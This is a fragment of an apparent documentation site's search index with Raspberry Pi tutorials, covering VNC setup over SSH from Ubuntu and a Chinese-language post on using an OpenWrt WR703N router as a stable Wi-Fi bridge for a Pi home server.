packages you are installing and the output of the commands you run. If you are doing this it\u2019s quite probable you are used to being frustrated with broken packages or doing a lot of Google to fix tiny hidden errors that will only happen in your system. I really hope this post will help anyone that tries to accomplish a similar result in using the Raspberry Pi as a development server, regardless of your PHP framework, versions and project requirements. \u539f\u6587\u94fe\u63a5\uff1a https://medium.com/@roniemeque/using-raspberry-pi-for-laravel-developing-30dabcdeba43","title":"And that\u2019s it"},{"location":"RPI/VNC%20setup%20on%20Raspberry%20Pi%20from%20Ubuntu/","text":"VNC setup on Raspberry Pi from Ubuntu VNC setup on Raspberry Pi from Ubuntu This tutorial will demonstrate how to setup and connect to a Raspberry Pi over VNC from Ubuntu. This process is easier if you have a display connected to the Raspberry Pi, but will also show the steps to connect with only Ethernet and power connected. It assumes you have Debian for Raspberry Pi installed on an SD card. If not, see RPi Easy SD card setup Getting the IP address of the Raspberry Pi The first step is to locate the Raspberry Pi on your network. If you have access to a display for your Raspberry Pi, this task is simple, in a terminal simply type: ifconfig All the network interface configurations will be displayed, including the IP address. However, if you don\u2019t have a display for your Raspberry Pi, this isn\u2019t an option. For this task, we can use the Linux nmap (Network Mapper) utility. sudo apt-get install nmap Then run a scan on your local network. Be change to the specifics of your own network. nmap -sV -p 22 192.168.0.1-255 The results will display every machine that could be identified on port 22. The Raspberry Pi (running Debian) looks something like this: Nmap scan report for 192.168.0.112 Host is up (0.033s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 5.5p1 Debian 6+squeeze2 (protocol 2.0) Service Info: OS: Linux Connecting over SSH So we know that the Raspberry Pi has IP address: 192.168.0.112. Now we can ssh to it: ssh pi@192.168.0.112 And you should receive a message like this: The authenticity of host \u2018192.168.0.112 (192.168.0.112)\u2019 can\u2019t be established. RSA key fingerprint is xx:xx:xx:xx:xx:xx:xx:xx:xx:xx:xx:xx:xx:xx:xx:xx. Are you sure you want to continue connecting (yes/no)? Type yes at the prompt, then enter the password for the user pi, \u2018raspberry\u2019 by default. You should get a prompt that looks like this: pi@raspberrypi:~$ Configuring VNC Now that we have logged in to the Raspberry Pi, we can setup VNC for remote access. First we need to install the VNC server: sudo apt-get install tightvncserver Next, start the VNC server on the Raspberry Pi. Adjust the geometry paramater to your desired display size. vncserver :1 -geometry 1024x600 -depth 16 -pixelformat rgb565 You will be prompted to create a password for VNC login. Once you do, you should see a line looking something like this: New \u2018X\u2019 desktop is raspberrypi:1 Now, we can finally connect to the Pi with VNC. Back on the Ubuntu machine, install the VNC viewer client: sudo apt-get install xtightvncviewer Then connect to the running VNC server: vncviewer 192.168.0.112:5901 To stop the VNC viewer, just close the application. To stop the VNC server, issue the following command (on the Raspberry Pi): vncserver -kill :1 \u539f\u6587\u94fe\u63a5\uff1a https://mitchtech.net/vnc-setup-on-raspberry-pi-from-ubuntu/","title":"VNC setup on Raspberry Pi from Ubuntu"},{"location":"RPI/VNC%20setup%20on%20Raspberry%20Pi%20from%20Ubuntu/#vnc-setup-on-raspberry-pi-from-ubuntu","text":"","title":"VNC setup on Raspberry Pi from Ubuntu"},{"location":"RPI/VNC%20setup%20on%20Raspberry%20Pi%20from%20Ubuntu/#vnc-setup-on-raspberry-pi-from-ubuntu_1","text":"This tutorial will demonstrate how to setup and connect to a Raspberry Pi over VNC from Ubuntu. This process is easier if you have a display connected to the Raspberry Pi, but will also show the steps to connect with only Ethernet and power connected. It assumes you have Debian for Raspberry Pi installed on an SD card. If not, see RPi Easy SD card setup","title":"VNC setup on Raspberry Pi from Ubuntu"},{"location":"RPI/VNC%20setup%20on%20Raspberry%20Pi%20from%20Ubuntu/#getting-the-ip-address-of-the-raspberry-pi","text":"The first step is to locate the Raspberry Pi on your network. If you have access to a display for your Raspberry Pi, this task is simple, in a terminal simply type: ifconfig All the network interface configurations will be displayed, including the IP address. However, if you don\u2019t have a display for your Raspberry Pi, this isn\u2019t an option. For this task, we can use the Linux nmap (Network Mapper) utility. sudo apt-get install nmap Then run a scan on your local network. Be change to the specifics of your own network. nmap -sV -p 22 192.168.0.1-255 The results will display every machine that could be identified on port 22. The Raspberry Pi (running Debian) looks something like this: Nmap scan report for 192.168.0.112 Host is up (0.033s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 5.5p1 Debian 6+squeeze2 (protocol 2.0) Service Info: OS: Linux","title":"Getting the IP address of the Raspberry Pi"},{"location":"RPI/VNC%20setup%20on%20Raspberry%20Pi%20from%20Ubuntu/#connecting-over-ssh","text":"So we know that the Raspberry Pi has IP address: 192.168.0.112. Now we can ssh to it: ssh pi@192.168.0.112 And you should receive a message like this: The authenticity of host \u2018192.168.0.112 (192.168.0.112)\u2019 can\u2019t be established. RSA key fingerprint is xx:xx:xx:xx:xx:xx:xx:xx:xx:xx:xx:xx:xx:xx:xx:xx. Are you sure you want to continue connecting (yes/no)? Type yes at the prompt, then enter the password for the user pi, \u2018raspberry\u2019 by default. You should get a prompt that looks like this: pi@raspberrypi:~$","title":"Connecting over SSH"},{"location":"RPI/VNC%20setup%20on%20Raspberry%20Pi%20from%20Ubuntu/#configuring-vnc","text":"Now that we have logged in to the Raspberry Pi, we can setup VNC for remote access. First we need to install the VNC server: sudo apt-get install tightvncserver Next, start the VNC server on the Raspberry Pi. Adjust the geometry paramater to your desired display size. vncserver :1 -geometry 1024x600 -depth 16 -pixelformat rgb565 You will be prompted to create a password for VNC login. Once you do, you should see a line looking something like this: New \u2018X\u2019 desktop is raspberrypi:1 Now, we can finally connect to the Pi with VNC. Back on the Ubuntu machine, install the VNC viewer client: sudo apt-get install xtightvncviewer Then connect to the running VNC server: vncviewer 192.168.0.112:5901 To stop the VNC viewer, just close the application. To stop the VNC server, issue the following command (on the Raspberry Pi): vncserver -kill :1 \u539f\u6587\u94fe\u63a5\uff1a https://mitchtech.net/vnc-setup-on-raspberry-pi-from-ubuntu/","title":"Configuring VNC"},{"location":"RPI/%E4%B8%BA%E6%A0%91%E8%8E%93%E6%B4%BEDIY%E4%B8%80%E6%AC%BE%E9%AB%98%E9%80%9F%E7%A8%B3%E5%AE%9A%E7%9A%84%E6%97%A0%E7%BA%BF%E7%BD%91%E5%8D%A1/","text":"\u4e3a\u6811\u8393\u6d3eDIY\u4e00\u6b3e\u9ad8\u901f\u7a33\u5b9a\u7684\u65e0\u7ebf\u7f51\u5361 \u8bf4\u660e \u6211\u7684\u6811\u8393\u6d3e\u7528\u4f5cNAS+\u5f71\u97f3\u670d\u52a1\u5668\uff0c\u56e0\u4e3a\u4e0d\u60f3\u88ab\u7f51\u7ebf\u675f\u7f1a\uff0c\u6240\u4ee5\u6811\u8393\u6d3e\u662f\u901a\u8fc7\u65e0\u7ebf\u7f51\u5361\u8fde\u63a5\u5bb6\u91cc\u7684\u4e3b\u8def\u7531WIFI\u6765\u4e0a\u7f51\u7684\uff0c\u8fd9\u6837\u5c31\u53ef\u4ee5\u628a\u6811\u8393\u6d3e\u6254\u5230\u51b0\u7bb1\u9876\u4e0a\u5e76\u4fdd\u630124\u5c0f\u65f6\u5f00\u673a\u4e86\u3002 \u53ef\u60dc\u7684\u662f\u6811\u8393\u6d3e\u5bf9\u65e0\u7ebf\u7f51\u5361\u7684\u652f\u6301\u4f3c\u4e4e\u5e76\u4e0d\u597d\uff0c\u9996\u5148\u662f\u901f\u5ea6\u6162\uff0c\u6211\u7684\u6811\u8393\u6d3e\u4f7f\u7528WIFI\u53ea\u6709\u5927\u7ea61.3M\u5de6\u53f3\u7684\u8bfb\u53d6\u901f\u5ea6\u548c1M\u5de6\u53f3\u7684\u5199\u5165\u901f\u5ea6\uff1b\u5176\u6b21\u7a33\u5b9a\u6027\u4e5f\u6ca1\u6709\u60f3\u8c61\u4e2d\u597d\uff0c\u5728\u8fd9\u4e48\u6162\u7684\u5199\u5165\u901f\u5ea6\u4e0b\u6709\u65f6\u901f\u5ea6\u4f1a\u76f4\u8fbe0\u7136\u540eWIFI\u6389\u7ebf\u3002 \u6211\u5c1d\u8bd5\u8fc74\u6b3e\u4e0d\u540c\u7684\u65e0\u7ebf\u7f51\u5361\uff0c\u5305\u62ec EP-N8508GS (8188ucs ), \u6c34\u661f MW150US (rtl8188eu) , \u78ca\u79d1 NW367 (rtl8192CU) \u548c \u5fc5\u8054 BL-WN2210 (rtl8192cu) . \u6bcf\u4e00\u6b3e\u90fd\u6709\u5b58\u5728\u540c\u6837\u7684\u95ee\u9898\u3002\u7f51\u4e0a\u80fd\u627e\u5230\u7684\u51e0\u4e4e\u6240\u6709\u65b9\u6848\uff0c\u4f8b\u5982\u6362\u7535\u6e90\u3001\u9650\u5236\u7f51\u901f\u3001\u5173\u95ed\u6811\u8393\u6d3eOTG\u82af\u7247\u7684Turbo\u6a21\u5f0f\u2026\u4e0d\u7a33\u5b9a\u7684\u73b0\u8c61\u4f9d\u7136\u5b58\u5728\u3002\u5947\u602a\u7684\u662f\uff0c\u6d4b\u8bd5\u53d1\u73b0\u6811\u8393\u6d3e\u7684\u6709\u7ebf\u8fde\u63a5\u975e\u5e38\u4e0d\u4ec5\u7a33\u5b9a\uff0c\u800c\u4e14\u901f\u5ea6\u4e5f\u8981\u597d\u5f88\u591a\uff0c\u5cf0\u503c\u8bfb\u53d6\u53ef\u8fbe7M/S\u3002\u4f46\u662f\u56e0\u4e3a\u4e0d\u60f3\u770b\u5230\u773c\u524d\u7ed5\u7740\u5404\u79cd\u7ebf(\u5f3a\u8feb\u75c7\u4f24\u4e0d\u8d77\u2026)\uff0c\u6240\u4ee5\u5b81\u613f\u5fcd\u53d7WIFI\u6389\u7ebf\u4e5f\u4e0d\u60f3\u7528\u6709\u7ebf\u8fde\u63a5\u3002 \u5c31\u8fd9\u6837\u5c06\u5c31\u7740\u7528\u4e86\u51e0\u4e2a\u6708\uff0c\u671f\u95f4\u867d\u7136\u6709\u65e0\u6570\u6b21\u60f3\u628a\u6811\u8393\u6d3e\u62cd\u5728\u5899\u4e0a\u7684\u51b2\u52a8\uff0c\u4e0d\u8fc7\u7531\u4e8e\u6811\u8393\u6d3e\u8eb2\u5728\u51b0\u7bb1\u9876\u7684\u89d2\u843d\u800c\u5e78\u8fd0\u7684\u8eb2\u8fc7\u4e00\u6b21\u6b21\u7684\u52ab\u96be\u2026\u6700\u8fd1\u65b0\u6362\u4e86\u4e2a\u4e3b\u8def\u7531\u5668\uff0c\u770b\u7740\u6dd8\u6c70\u4e0b\u6765\u7684WR703N\uff0c\u7a81\u7136\u7075\u5149\u4e00\u73b0\uff0c\u8fd9\u4e2a\u8def\u7531\u5668\u4e0d\u5c31\u662f\u5757\u65e0\u7ebf\u7f51\u5361\u5417\uff1f\u800c\u4e14\u662f\u4e13\u4e1a\u7684\uff01\u7a33\u5b9a\u6027\u548c\u901f\u5ea6\u90fd\u5e94\u8be5\u4e0d\u9519\uff01 \u539f\u7406 WR703N\u8def\u7531\u5668\u5237OpenWrt\u56fa\u4ef6\u540e\u5177\u6709 \u4e2d\u7ee7 \u6a21\u5f0f\uff0c\u7b80\u5355\u5730\u8bf4\uff0c\u5c31\u662f\u5c06\u8def\u7531\u5668\u5f53\u6210\u65e0\u7ebf\u57fa\u7ad9\uff0c\u63a5\u6536\u4e0a\u7ea7\u8def\u7531\u7684WIFI\u4fe1\u53f7\uff0c\u7136\u540e\u5c06\u4e0a\u7ea7\u8def\u7531\u7684\u7f51\u7edc\u901a\u8fc7\u6709\u7ebf\u6216WIFI\u5206\u4eab\u7ed9\u5176\u4ed6\u8bbe\u5907\u3002\u6240\u4ee5\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528WR703N\u8fde\u63a5\u4e0a\u7ea7\u8def\u7531\u7684WIFI\uff0c\u6811\u8393\u6d3e\u8fde\u4e0aWR703N\u7684\u6709\u7ebf\u63a5\u53e3\uff0c\u4ece\u800c\u5efa\u7acb\u6811\u8393\u6d3e\u548c\u4e0a\u7ea7\u8def\u7531\u7684\u8fde\u63a5\u3002\u76f8\u5f53\u4e8eWR703N\u53d8\u6210\u4e86\u4e00\u5757\u65e0\u7ebf\u7f51\u5361\u3002\u800c\u5bf9\u4e8e\u6811\u8393\u6d3e\u6765\u8bf4\uff0c\u56e0\u4e3a\u5b83\u662f\u901a\u8fc7\u6709\u7ebf\u7f51\u53e3\u548cWR703N\u8fde\u63a5\u7684\uff0c\u4e0d\u4f1a\u51fa\u73b0\u4f7f\u7528\u65e0\u7ebf\u7f51\u5361\u65f6\u4e0d\u7a33\u5b9a\u7684\u60c5\u51b5\u3002\u7f51\u7edc\u62d3\u6251\u56fe\u5982\u4e0b\uff1a \u6211\u7684\u4e3b\u8def\u7531\u5185\u7f51\u4e3a 10.1.1.x \uff0c\u7535\u8111\u3001\u624b\u673a\u3001IPAD\u7b49\u8bbe\u5907\u901a\u8fc7WIFI\u76f4\u63a5\u8fde\u5230\u4e3b\u8def\u7531\uff0c WR703N \u9996\u5148\u901a\u8fc7WIFI\u8fde\u63a5\u5230\u4e3b\u8def\u7531\uff0c\u7136\u540e\u901a\u8fc7\u6709\u7ebf\u5c06\u7f51\u7edc\u6865\u63a5\u5230\u6811\u8393\u6d3e\u3002\u65e0\u7ebf\u8def\u7531\u5668\u53ef\u4ee5\u4f7f\u7528 \u4e2d\u7ee7 \u548c \u6865\u63a5 \u4e24\u79cd\u6a21\u5f0f\u6765\u5b9e\u73b0\u8fde\u63a5\uff0c\u6211\u4f7f\u7528\u7684\u662f\u6865\u63a5\u6a21\u5f0f\uff0c\u4ee5\u4fdd\u8bc1\u6240\u6709\u8bbe\u5907\u90fd\u5904\u4e8e\u540c\u4e00\u4e2a\u7f51\u6bb5\uff0c\u8fd9\u6837\u53ef\u4ee5\u5b8c\u7f8e\u652f\u6301minidlna\u7b49upnp\u7a0b\u5e8f\u3002 \u786c\u4ef6\u8fde\u63a5 \u6211\u7684\u6811\u8393\u6d3e\u548c\u5916\u8bbe\u662f\u901a\u8fc7\u5927\u91cf\u7684\u87ba\u4e1d\u548c\u7a7f\u5b54\u56fa\u5b9a\u5728\u4e00\u5757\u57fa\u677f\u4e0a\u7684\uff0c\u6240\u4ee5\u53ea\u8981\u5c06WR703N\u4e5f\u4f5c\u4e3a\u4e00\u4e2a\u5916\u8bbe\u56fa\u5b9a\u4e0a\u53bb\u5c31\u884c\u4e86\u3002 \u8fd9\u662f\u6ca1\u6709\u5916\u8bbe\u7684\u6837\u5b50\uff1a WR703N\u548c\u98da\u738b\u7684Hub\u56fa\u5b9a\uff0c\u901a\u8fc7\u6811\u8393\u6d3e\u7684USB\u63a5\u53e3\u76f4\u63a5\u9a71\u52a8\u4e24\u5757U\u76d8\u3001\u4e00\u4e2a\u97f3\u54cd\u548c\u4e00\u4e2a\u8def\u7531\u5668\uff0c\u8c01\u8bf4\u6811\u8393\u6d3eU\u53e3\u7684\u9a71\u52a8\u80fd\u529b\u4f4e\u7684\uff1f \u7ec4\u5408\u4e00\u4e0b\uff0cDIY\u7684\u90a3\u6839\u9ed1\u8272USB\u7ebf\u5185\u90e8\u96c6\u6210\u4e86\u4e00\u9897 PL2303 \u82af\u7247\uff0c\u8fde\u63a5\u540e\u6811\u8393\u6d3e\u53ef\u4ee5\u901a\u8fc7\u4e32\u53e3\u8c03\u8bd5WR703N\u3002 \u4e0a\u7535\u5f00\u673a\uff0c\u5f53\u7136\uff0c\u4e0a\u7535\u4e4b\u524d\u7ecf\u5386\u4e86\u8270\u82e6\u5353\u7edd\u7684\u8c03\u8bd5\u3002 \u6d4b\u8bd5 \u5b89\u88c5\u5b8c\u6210\u4e4b\u540e\u505a\u4e86\u4e9b\u7b80\u5355\u7684\u6d4b\u8bd5\uff0c\u8fd9\u6b3eDIY\u7684\u6811\u8393\u6d3e\u65e0\u7ebf\u7f51\u5361\u901f\u5ea6\u548c\u7a33\u5b9a\u6027\u5b8c\u5168\u7b26\u5408\u6211\u7684\u9884\u671f\uff01\u4e0b\u9762\u662f\u4e00\u4e9b\u6d4b\u8bd5\u7ed3\u679c\uff1a Samba\u8bfb\u53d6\u901f\u5ea6\u4e3a3.5~4.5 M/S. Samba\u5199\u5165\u901f\u5ea6\u4e3a3~3.3M/S. \u9891\u7e41\u901a\u8fc7Samba\u8bfb\u5199\u6811\u8393\u6d3e\u4e0a\u7684\u6587\u4ef6\uff0c\u5728\u8bfb\u53d68G\uff0c\u5199\u51655G\u7684\u6570\u636e\u4e4b\u540e\u6ca1\u6709\u51fa\u73b0\u6b7b\u673a\u5361\u6b7b\u7684\u60c5\u51b5\u3002 \u603b\u7ed3 \u4ece\u4e0a\u9762\u7684\u6d4b\u8bd5\u7ed3\u679c\u548c\u6211\u51e0\u5929\u7684\u4f7f\u7528\u60c5\u51b5\u770b\u6765\uff0c\u8fd9\u6b3eDIY\u7684\u6811\u8393\u6d3e \u65e0\u7ebf\u7f51\u5361 \u62e5\u6709\u975e\u5e38\u53ef\u89c2\u7684\u901f\u5ea6\u548c\u7a33\u5b9a\u6027,\u53ef\u4ee5\u65e0\u89c6\u5e02\u9762\u4e0a\u5927\u90e8\u5206\u65e0\u7ebf\u7f51\u5361\u4e86\u3002 \u5728\u8c03\u8bd5\u8fd9\u6b3e\u7f51\u5361\u65f6\u82b1\u4e86\u4e0d\u5c11\u65f6\u95f4\uff0c\u65e0\u6570\u6b21\u60f3Knock my head against the wall.\u6211\u4f1a\u5c06\u8c03\u8bd5\u8fc7\u7a0b\u548c\u9047\u5230\u7684\u95ee\u9898\u8bb0\u5f55\u5728\u53e6\u4e00\u7bc7\u6587\u7ae0\u3002 \u539f\u6587\u94fe\u63a5\uff1a https://www.shuyz.com/posts/diy-stable-wifi-adapter-for-raspberry-pi/","title":"\u4e3a\u6811\u8393\u6d3eDIY\u4e00\u6b3e\u9ad8\u901f\u7a33\u5b9a\u7684\u65e0\u7ebf\u7f51\u5361"},{"location":"RPI/%E4%B8%BA%E6%A0%91%E8%8E%93%E6%B4%BEDIY%E4%B8%80%E6%AC%BE%E9%AB%98%E9%80%9F%E7%A8%B3%E5%AE%9A%E7%9A%84%E6%97%A0%E7%BA%BF%E7%BD%91%E5%8D%A1/#diy","text":"","title":"\u4e3a\u6811\u8393\u6d3eDIY\u4e00\u6b3e\u9ad8\u901f\u7a33\u5b9a\u7684\u65e0\u7ebf\u7f51\u5361"},{"location":"RPI/%E4%B8%BA%E6%A0%91%E8%8E%93%E6%B4%BEDIY%E4%B8%80%E6%AC%BE%E9%AB%98%E9%80%9F%E7%A8%B3%E5%AE%9A%E7%9A%84%E6%97%A0%E7%BA%BF%E7%BD%91%E5%8D%A1/#_1","text":"\u6211\u7684\u6811\u8393\u6d3e\u7528\u4f5cNAS+\u5f71\u97f3\u670d\u52a1\u5668\uff0c\u56e0\u4e3a\u4e0d\u60f3\u88ab\u7f51\u7ebf\u675f\u7f1a\uff0c\u6240\u4ee5\u6811\u8393\u6d3e\u662f\u901a\u8fc7\u65e0\u7ebf\u7f51\u5361\u8fde\u63a5\u5bb6\u91cc\u7684\u4e3b\u8def\u7531WIFI\u6765\u4e0a\u7f51\u7684\uff0c\u8fd9\u6837\u5c31\u53ef\u4ee5\u628a\u6811\u8393\u6d3e\u6254\u5230\u51b0\u7bb1\u9876\u4e0a\u5e76\u4fdd\u630124\u5c0f\u65f6\u5f00\u673a\u4e86\u3002 \u53ef\u60dc\u7684\u662f\u6811\u8393\u6d3e\u5bf9\u65e0\u7ebf\u7f51\u5361\u7684\u652f\u6301\u4f3c\u4e4e\u5e76\u4e0d\u597d\uff0c\u9996\u5148\u662f\u901f\u5ea6\u6162\uff0c\u6211\u7684\u6811\u8393\u6d3e\u4f7f\u7528WIFI\u53ea\u6709\u5927\u7ea61.3M\u5de6\u53f3\u7684\u8bfb\u53d6\u901f\u5ea6\u548c1M\u5de6\u53f3\u7684\u5199\u5165\u901f\u5ea6\uff1b\u5176\u6b21\u7a33\u5b9a\u6027\u4e5f\u6ca1\u6709\u60f3\u8c61\u4e2d\u597d\uff0c\u5728\u8fd9\u4e48\u6162\u7684\u5199\u5165\u901f\u5ea6\u4e0b\u6709\u65f6\u901f\u5ea6\u4f1a\u76f4\u8fbe0\u7136\u540eWIFI\u6389\u7ebf\u3002 \u6211\u5c1d\u8bd5\u8fc74\u6b3e\u4e0d\u540c\u7684\u65e0\u7ebf\u7f51\u5361\uff0c\u5305\u62ec EP-N8508GS (8188ucs ), \u6c34\u661f MW150US (rtl8188eu) , \u78ca\u79d1 NW367 (rtl8192CU) \u548c \u5fc5\u8054 BL-WN2210 (rtl8192cu) . \u6bcf\u4e00\u6b3e\u90fd\u6709\u5b58\u5728\u540c\u6837\u7684\u95ee\u9898\u3002\u7f51\u4e0a\u80fd\u627e\u5230\u7684\u51e0\u4e4e\u6240\u6709\u65b9\u6848\uff0c\u4f8b\u5982\u6362\u7535\u6e90\u3001\u9650\u5236\u7f51\u901f\u3001\u5173\u95ed\u6811\u8393\u6d3eOTG\u82af\u7247\u7684Turbo\u6a21\u5f0f\u2026\u4e0d\u7a33\u5b9a\u7684\u73b0\u8c61\u4f9d\u7136\u5b58\u5728\u3002\u5947\u602a\u7684\u662f\uff0c\u6d4b\u8bd5\u53d1\u73b0\u6811\u8393\u6d3e\u7684\u6709\u7ebf\u8fde\u63a5\u975e\u5e38\u4e0d\u4ec5\u7a33\u5b9a\uff0c\u800c\u4e14\u901f\u5ea6\u4e5f\u8981\u597d\u5f88\u591a\uff0c\u5cf0\u503c\u8bfb\u53d6\u53ef\u8fbe7M/S\u3002\u4f46\u662f\u56e0\u4e3a\u4e0d\u60f3\u770b\u5230\u773c\u524d\u7ed5\u7740\u5404\u79cd\u7ebf(\u5f3a\u8feb\u75c7\u4f24\u4e0d\u8d77\u2026)\uff0c\u6240\u4ee5\u5b81\u613f\u5fcd\u53d7WIFI\u6389\u7ebf\u4e5f\u4e0d\u60f3\u7528\u6709\u7ebf\u8fde\u63a5\u3002 \u5c31\u8fd9\u6837\u5c06\u5c31\u7740\u7528\u4e86\u51e0\u4e2a\u6708\uff0c\u671f\u95f4\u867d\u7136\u6709\u65e0\u6570\u6b21\u60f3\u628a\u6811\u8393\u6d3e\u62cd\u5728\u5899\u4e0a\u7684\u51b2\u52a8\uff0c\u4e0d\u8fc7\u7531\u4e8e\u6811\u8393\u6d3e\u8eb2\u5728\u51b0\u7bb1\u9876\u7684\u89d2\u843d\u800c\u5e78\u8fd0\u7684\u8eb2\u8fc7\u4e00\u6b21\u6b21\u7684\u52ab\u96be\u2026\u6700\u8fd1\u65b0\u6362\u4e86\u4e2a\u4e3b\u8def\u7531\u5668\uff0c\u770b\u7740\u6dd8\u6c70\u4e0b\u6765\u7684WR703N\uff0c\u7a81\u7136\u7075\u5149\u4e00\u73b0\uff0c\u8fd9\u4e2a\u8def\u7531\u5668\u4e0d\u5c31\u662f\u5757\u65e0\u7ebf\u7f51\u5361\u5417\uff1f\u800c\u4e14\u662f\u4e13\u4e1a\u7684\uff01\u7a33\u5b9a\u6027\u548c\u901f\u5ea6\u90fd\u5e94\u8be5\u4e0d\u9519\uff01","title":"\u8bf4\u660e"},{"location":"RPI/%E4%B8%BA%E6%A0%91%E8%8E%93%E6%B4%BEDIY%E4%B8%80%E6%AC%BE%E9%AB%98%E9%80%9F%E7%A8%B3%E5%AE%9A%E7%9A%84%E6%97%A0%E7%BA%BF%E7%BD%91%E5%8D%A1/#_2","text":"WR703N\u8def\u7531\u5668\u5237OpenWrt\u56fa\u4ef6\u540e\u5177\u6709 \u4e2d\u7ee7 \u6a21\u5f0f\uff0c\u7b80\u5355\u5730\u8bf4\uff0c\u5c31\u662f\u5c06\u8def\u7531\u5668\u5f53\u6210\u65e0\u7ebf\u57fa\u7ad9\uff0c\u63a5\u6536\u4e0a\u7ea7\u8def\u7531\u7684WIFI\u4fe1\u53f7\uff0c\u7136\u540e\u5c06\u4e0a\u7ea7\u8def\u7531\u7684\u7f51\u7edc\u901a\u8fc7\u6709\u7ebf\u6216WIFI\u5206\u4eab\u7ed9\u5176\u4ed6\u8bbe\u5907\u3002\u6240\u4ee5\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528WR703N\u8fde\u63a5\u4e0a\u7ea7\u8def\u7531\u7684WIFI\uff0c\u6811\u8393\u6d3e\u8fde\u4e0aWR703N\u7684\u6709\u7ebf\u63a5\u53e3\uff0c\u4ece\u800c\u5efa\u7acb\u6811\u8393\u6d3e\u548c\u4e0a\u7ea7\u8def\u7531\u7684\u8fde\u63a5\u3002\u76f8\u5f53\u4e8eWR703N\u53d8\u6210\u4e86\u4e00\u5757\u65e0\u7ebf\u7f51\u5361\u3002\u800c\u5bf9\u4e8e\u6811\u8393\u6d3e\u6765\u8bf4\uff0c\u56e0\u4e3a\u5b83\u662f\u901a\u8fc7\u6709\u7ebf\u7f51\u53e3\u548cWR703N\u8fde\u63a5\u7684\uff0c\u4e0d\u4f1a\u51fa\u73b0\u4f7f\u7528\u65e0\u7ebf\u7f51\u5361\u65f6\u4e0d\u7a33\u5b9a\u7684\u60c5\u51b5\u3002\u7f51\u7edc\u62d3\u6251\u56fe\u5982\u4e0b\uff1a \u6211\u7684\u4e3b\u8def\u7531\u5185\u7f51\u4e3a 10.1.1.x \uff0c\u7535\u8111\u3001\u624b\u673a\u3001IPAD\u7b49\u8bbe\u5907\u901a\u8fc7WIFI\u76f4\u63a5\u8fde\u5230\u4e3b\u8def\u7531\uff0c WR703N \u9996\u5148\u901a\u8fc7WIFI\u8fde\u63a5\u5230\u4e3b\u8def\u7531\uff0c\u7136\u540e\u901a\u8fc7\u6709\u7ebf\u5c06\u7f51\u7edc\u6865\u63a5\u5230\u6811\u8393\u6d3e\u3002\u65e0\u7ebf\u8def\u7531\u5668\u53ef\u4ee5\u4f7f\u7528 \u4e2d\u7ee7 \u548c \u6865\u63a5 \u4e24\u79cd\u6a21\u5f0f\u6765\u5b9e\u73b0\u8fde\u63a5\uff0c\u6211\u4f7f\u7528\u7684\u662f\u6865\u63a5\u6a21\u5f0f\uff0c\u4ee5\u4fdd\u8bc1\u6240\u6709\u8bbe\u5907\u90fd\u5904\u4e8e\u540c\u4e00\u4e2a\u7f51\u6bb5\uff0c\u8fd9\u6837\u53ef\u4ee5\u5b8c\u7f8e\u652f\u6301minidlna\u7b49upnp\u7a0b\u5e8f\u3002","title":"\u539f\u7406"},{"location":"RPI/%E4%B8%BA%E6%A0%91%E8%8E%93%E6%B4%BEDIY%E4%B8%80%E6%AC%BE%E9%AB%98%E9%80%9F%E7%A8%B3%E5%AE%9A%E7%9A%84%E6%97%A0%E7%BA%BF%E7%BD%91%E5%8D%A1/#_3","text":"\u6211\u7684\u6811\u8393\u6d3e\u548c\u5916\u8bbe\u662f\u901a\u8fc7\u5927\u91cf\u7684\u87ba\u4e1d\u548c\u7a7f\u5b54\u56fa\u5b9a\u5728\u4e00\u5757\u57fa\u677f\u4e0a\u7684\uff0c\u6240\u4ee5\u53ea\u8981\u5c06WR703N\u4e5f\u4f5c\u4e3a\u4e00\u4e2a\u5916\u8bbe\u56fa\u5b9a\u4e0a\u53bb\u5c31\u884c\u4e86\u3002 \u8fd9\u662f\u6ca1\u6709\u5916\u8bbe\u7684\u6837\u5b50\uff1a WR703N\u548c\u98da\u738b\u7684Hub\u56fa\u5b9a\uff0c\u901a\u8fc7\u6811\u8393\u6d3e\u7684USB\u63a5\u53e3\u76f4\u63a5\u9a71\u52a8\u4e24\u5757U\u76d8\u3001\u4e00\u4e2a\u97f3\u54cd\u548c\u4e00\u4e2a\u8def\u7531\u5668\uff0c\u8c01\u8bf4\u6811\u8393\u6d3eU\u53e3\u7684\u9a71\u52a8\u80fd\u529b\u4f4e\u7684\uff1f \u7ec4\u5408\u4e00\u4e0b\uff0cDIY\u7684\u90a3\u6839\u9ed1\u8272USB\u7ebf\u5185\u90e8\u96c6\u6210\u4e86\u4e00\u9897 PL2303 \u82af\u7247\uff0c\u8fde\u63a5\u540e\u6811\u8393\u6d3e\u53ef\u4ee5\u901a\u8fc7\u4e32\u53e3\u8c03\u8bd5WR703N\u3002 \u4e0a\u7535\u5f00\u673a\uff0c\u5f53\u7136\uff0c\u4e0a\u7535\u4e4b\u524d\u7ecf\u5386\u4e86\u8270\u82e6\u5353\u7edd\u7684\u8c03\u8bd5\u3002","title":"\u786c\u4ef6\u8fde\u63a5"},{"location":"RPI/%E4%B8%BA%E6%A0%91%E8%8E%93%E6%B4%BEDIY%E4%B8%80%E6%AC%BE%E9%AB%98%E9%80%9F%E7%A8%B3%E5%AE%9A%E7%9A%84%E6%97%A0%E7%BA%BF%E7%BD%91%E5%8D%A1/#_4","text":"\u5b89\u88c5\u5b8c\u6210\u4e4b\u540e\u505a\u4e86\u4e9b\u7b80\u5355\u7684\u6d4b\u8bd5\uff0c\u8fd9\u6b3eDIY\u7684\u6811\u8393\u6d3e\u65e0\u7ebf\u7f51\u5361\u901f\u5ea6\u548c\u7a33\u5b9a\u6027\u5b8c\u5168\u7b26\u5408\u6211\u7684\u9884\u671f\uff01\u4e0b\u9762\u662f\u4e00\u4e9b\u6d4b\u8bd5\u7ed3\u679c\uff1a Samba\u8bfb\u53d6\u901f\u5ea6\u4e3a3.5~4.5 M/S. Samba\u5199\u5165\u901f\u5ea6\u4e3a3~3.3M/S. 